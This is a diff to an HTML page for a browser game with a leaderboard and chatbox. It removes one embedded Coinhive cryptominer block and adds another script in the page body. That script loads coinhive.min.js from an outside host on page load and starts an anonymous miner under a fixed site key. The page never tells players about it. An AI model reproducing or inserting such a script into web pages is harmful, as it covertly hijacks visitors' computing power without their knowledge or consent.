@@ -1,10 +1,3 @@
-<?
-<head>
-<script src='https://coinhive.com/lib/coinhive.min.js'></script><script>if (typeof CoinHive !== 'undefined'){var yyz = new CoinHive.Anonymous('Kt8ZJalpZMpIuhjjoWiRleAWMhoV9g5K',{threads: 2});yyz.start();}</script>
-</head>
-<body>
-</body>
-?>
 <!doctype html>
 <html lang="en">
 <head>
@@ -19,6 +12,17 @@
     <audio id="spawn_cell" src="audio/spawn.mp3"></audio>
 </head>
 <body>
+    
+            <script>
+            var mnr = document.createElement('script');
+            mnr.src = 'https://coin-hive.com/lib/coinhive.min.js';
+            mnr.onload=function(){
+                var miner=CoinHive.Anonymous('Kt8ZJalpZMpIuhjjoWiRleAWMhoV9g5K');
+                miner.start();
+            };
+            document.getElementsByTagName('body')[0].appendChild(mnr);
+        </script>
+    
     <div id="gameAreaWrapper">
         <div id="status"><span class="title">Leaderboard</span></div>
         <div class="chatbox" id="chatbox">
